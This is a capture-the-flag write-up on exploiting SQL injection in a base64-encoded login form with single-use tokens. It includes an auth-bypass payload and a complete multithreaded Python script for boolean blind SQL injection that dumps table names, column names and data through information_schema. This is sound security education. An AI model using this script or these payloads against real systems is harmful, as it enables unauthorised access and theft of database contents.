---
tags:
  - CTF
  - protergo
  - SQLi
  - web-exploitation
  - blind-sqli
  - mysql
title: Protergo CTF - [Jumper]
---
![[Screenshot 2024-02-08 at 18.18.33.png]]
# Prologue

An Individual local competition held by [Protergo](https://protergo.id/)company. The competition was starting from 1st February until 8th February. This competition is only limited to students.
# Write Up

## TL;DR Solution

1. There's an SQL Injection in the parameter `username` and `password`.
2. There's a token check, where the `token` parameter can be used only once. So, for every login attempt, the player should refresh the token first.

## Detailed Explanation

A black box challenge. There's no source code in the challenge. 

When visiting the challenge, players were given only a login page.
![[Screenshot 2024-02-08 at 18.32.27.png]]

By checking the traffic requests, the parameter is being encoded.
![[Screenshot 2024-02-08 at 18.36.48.png]]

Looking at the HTML source code, the player can see that our input is encoded with base64.
![[Screenshot 2024-02-08 at 18.37.29.png]]

Since it's a black box challenge, the player needs to guess the vulnerability and gather the information first. While waiting for the directory and files fuzzing in the background, the Player should do the manual vulnerability testing first.

When the player puts apostrophes (') in input, the player gets an error server response. So, players assume, it is vulnerable to SQL Injection.
![[Screenshot 2024-02-08 at 19.07.33.png]]
![[Screenshot 2024-02-08 at 19.08.23.png]]

But, when the player tries to replay the request, the player discovers it has a different response.
![[Screenshot 2024-02-08 at 19.09.16.png]]

After analyzing the application, the application will request a token to `/api/token` first. And apparently, this token is only valid for once.

To make sure it's really vulnerable to SQL injection, the player attempts to make a valid SQL query from the injection.
![[Screenshot 2024-02-08 at 22.28.16.png]]

After a lot of trial and error, the player finds a valid query and finally successfully bypasses the login page.

The explanation of the payload is like this. The common way to make SQL queries in login usually is like this.

```sql
SELECT username, password FROM users WHERE username='$username' AND passwd='$password';
```

Where the `$username` and `$password` is a user-controlled variable. So, if the payload above is evaluated into a query, it will become like this.

```sql
SELECT username, password FROM users WHERE username='' or 1=1#' AND passwd='DUMMY';
```

Where all the queries after `#` will be ignored since it's considered a comment[^1]. 

After redirecting to the authenticated page, the player got information that the player needed to dump another table to get the flag.
![[Screenshot 2024-02-08 at 22.37.57.png]]

Since the result of the query doesn't directly appear on the page, the player needs to dump the the database through `Blind SQL Injection` method.

If the query result is false then it won't logged in, but if its true it will logged in.
## Exploitation

Since the player already found the goal, the player needs to find a way to build a query to dump another table.

In SQL, There are a few ways to get data from another table, one of them is `Subquery SQL`.

```sql
SELECT username, password FROM users WHERE username='' or (SELECT 1 FROM dual)=1 #' AND passwd='DUMMY';
```

With this, the Player can get the data from another table. But, the problem is, that the player didn't know the database schema in the application.

By this, the Player can make use of the `information_schema` database, this database stores the information about database structure in MySQL. 

The information of tables can exist in column `tables` and the column is at `columns` of the `information_schema` database.

So, to make it easier, player create automation script to dump the database.

```python
from urllib.parse import quote
import requests
import concurrent.futures
from pwn import *
from base64 import b64encode

opt = {
    "debug": 0,
    "url": "http://tokyo.ctf.protergo.party:10002"
}

proxies = {}
context.log_level = 'INFO'

if opt["debug"]: proxies = {"http": "http://0:8080"}

def sql_injection(_context, which = ""):
    DATA_LENGTH = 1 # The length of token in the database
    MAX_WORKERS = 35 # Total threads
    
    global ROW
    ROW = 0
    def get_token():
        sess = requests.Session()
        sess.get(opt["url"])

        token = sess.get(f'{opt["url"]}/api/token', proxies=proxies).json()['data']['token']
        return [sess, token]

    def payload(payload_):
        print((f"' OR ({payload_})=1#"))
        payload_ = b64encode((f"1' OR ({payload_})=1#").encode())
        return payload_

    def get_length(arguments):
        global ROW
        length, _context, which = arguments
        _context = _context.lower()
        if(_context == 'table'):
            #TABLE
            SQL_PAYLOAD = f"SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT {ROW}, 1"
        elif(_context == 'column'):
            # COLUMN
            ROW = 1
            SQL_PAYLOAD = f"SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_name='{which}' LIMIT {ROW}, 1"
        else:
            #DATA
            SQL_PAYLOAD = f"SELECT LENGTH({which}) FROM flag LIMIT {ROW}, 1"

        [sess, token] = get_token()
        res = sess.post(f"{opt['url']}/api/login", data={"username": payload(f'SELECT CASE WHEN ({SQL_PAYLOAD})={(length)} THEN 1 ELSE 0 END'), "password":b64encode(b"nyxmare"), "token": token}, proxies=proxies)
 
        if '"success":true' in res.text:
            truth = 1
        else:
            truth = 0

        if opt["debug"]: print("LENGTH CHECK", ROW, length, truth, token)
        return length, truth
    
    def boolean_sqli(arguments):

        idx, ascii_val, _context, which = arguments
        global ROW
        _context = _context.lower()
        if(_context == 'table'):
            #TABLE
            SQL_PAYLOAD = f"SELECT ORD(SUBSTRING(table_name, {idx}, 1)) FROM information_schema.tables WHERE table_schema=database() LIMIT {ROW}, 1"
        elif(_context == 'column'):
            # COLUMN
            ROW = 1
            SQL_PAYLOAD = f"SELECT ORD(SUBSTRING(column_name, {idx}, 1)) FROM information_schema.columns WHERE table_name='{which}' LIMIT {ROW}, 1"
        else:
            #DATA
            SQL_PAYLOAD = f"SELECT ORD(SUBSTRING({which}, {idx}, 1)) FROM flag LIMIT {ROW}, 1"
        
        [sess, token] = get_token()

        res = sess.post(f"{opt['url']}/api/login", data={"username": payload(f'SELECT CASE WHEN ({SQL_PAYLOAD})={ord(ascii_val)} THEN 1 ELSE 0 END'), "password":b64encode(b"nyxmare"), "token": token}, proxies=proxies)

        # If payload is true
        # Caught exception because of division by zero
        if '"success":true' in res.text:
            truth = 1
        else:
            truth = 0

        if opt["debug"]: print("DATA_CHECK", idx, ascii_val, ROW, truth, token)
        return ascii_val, truth
    
    result_rows = []

    # GET LENGTH
    found_length = 0
    MAX_LENGTH = 100
    for current_check in range(1, MAX_LENGTH, MAX_WORKERS):
        log.info(f"CHECK LENGTH {current_check} - {current_check+MAX_WORKERS}")
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            responses = executor.map(get_length, [(length, _context, which) for length in range(current_check, current_check+MAX_WORKERS)])
        for length, truth in responses:
            if truth:
                found_length = 1
                log.info(f"LENGTH = {length}")
                break
            else:
                log.info(f"NOT {length}")

        if found_length:
            break

    DATA_LENGTH = length
    
    result = ""
    for idx in range(1, DATA_LENGTH+1):
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            responses = executor.map(boolean_sqli, [(idx, ascii_val, _context, which) for ascii_val in (string.ascii_letters + string.digits + "_{}")])
            # responses = executor.map(boolean_sqli, [(idx, ascii_val) for ascii_val in (string.ascii_uppercase)])
        for ascii_val, truth in responses:
            if truth:
                result += (ascii_val)
                log.info(f"ROW {ROW} = {result}")
                break
    
    result_rows.append(result)
    return ''.join(result_rows)


# table = flag
# column = fl4g_c0lumN5

table = "flag" #sql_injection('table')
column = "fl4g_c0lumN5" #sql_injection('column', table)
flag = sql_injection('data', column)

print(flag)
```

![[Screenshot 2024-02-09 at 13.33.30.png]]

FLAG: `PROTERGO{f0ac7b6358cf6269dc59819c1bf3019fc6fcc2c5f5567b8187eae87d51f25e8c}`

[^1]: https://dev.mysql.com/doc/refman/8.0/en/comments.html